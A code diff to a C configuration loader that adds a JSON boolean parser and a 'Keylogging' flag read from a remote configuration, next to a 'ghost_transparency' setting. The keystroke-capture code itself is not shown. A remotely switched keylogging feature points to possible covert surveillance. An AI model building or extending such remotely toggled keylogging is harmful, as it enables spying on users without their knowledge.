@@ -38,6 +38,21 @@ static int parse_string_value(const char* json, const char* key, char* out, size
     return 1;
 }
 
+static int parse_bool_value(const char* json, const char* key, int* out) {
+    char search[64];
+    _snprintf_s(search, _countof(search), _TRUNCATE, "\"%s\"", key);
+    const char* pos = strstr(json, search);
+    if (!pos) return 0;
+    pos += strlen(search);
+    trim_whitespace(&pos);
+    if (*pos != ':') return 0;
+    pos++;
+    trim_whitespace(&pos);
+    if (strncmp(pos, "true", 4) == 0) { *out = 1; return 1; }
+    if (strncmp(pos, "false", 5) == 0) { *out = 0; return 1; }
+    return 0;
+}
+
 static int parse_int_value(const char* json, const char* key, int* out) {
     char search[64];
     _snprintf_s(search, _countof(search), _TRUNCATE, "\"%s\"", key);
@@ -94,6 +109,13 @@ int remote_config_load(remote_config_t* out_config) {
         out_config->ghost_transparency = trans;
     else
         out_config->ghost_transparency = 90;
+    int kl = 0;
+    if (parse_bool_value(buf, "Keylogging", &kl))
+        out_config->keylogging = kl;
+    else if (parse_int_value(buf, "Keylogging", &kl) && (kl == 0 || kl == 1))
+        out_config->keylogging = kl;
+    else
+        out_config->keylogging = 0;
     out_config->valid = 1;
     return 1;
 }
